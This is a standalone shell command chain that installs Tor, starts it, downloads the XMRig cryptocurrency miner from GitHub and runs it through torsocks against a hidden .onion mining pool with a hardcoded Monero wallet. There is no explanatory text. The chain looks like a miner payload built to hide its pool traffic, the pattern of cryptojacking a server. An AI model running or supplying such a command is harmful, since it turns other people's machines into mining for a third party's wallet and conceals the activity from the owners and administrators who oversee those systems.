sudo apt update && sudo apt install -y tor torsocks wget tar netcat-openbsd || true && \
sudo sed -i "s/^[[:space:]]*#\?[[:space:]]*SocksPort 9050.*/SocksPort 9050/" /etc/tor/torrc || true && \
# start tor if not listening on 9050
(ss -ltnp 2>/dev/null | grep -q ':9050') || (sudo tor & disown) && \
# wait up to 30s for tor to open 9050
for i in $(seq 1 30); do ss -ltnp 2>/dev/null | grep -q ':9050' && break || sleep 1; done && \
ss -ltnp | grep 9050 && \
wget -q https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-jammy-x64.tar.gz && \
tar xvaf xmrig-6.24.0-jammy-x64.tar.gz && cd xmrig-6.24.0 && chmod +x xmrig && \
torsocks ./xmrig -o mo2tor2amawhphlrgyaqlrqx7o27jaj7yldnx3t6jip3ow4bujlwz6id.onion:10001 -u 44dVFySgZBJhRPXg8cUqJv6Azait9G4k1Sg41ihdtgpi1sy3icvhXjr8tBkH31Sv1YeL78PGmcr8V29DCaGxT5kX9EmGhTw.vps
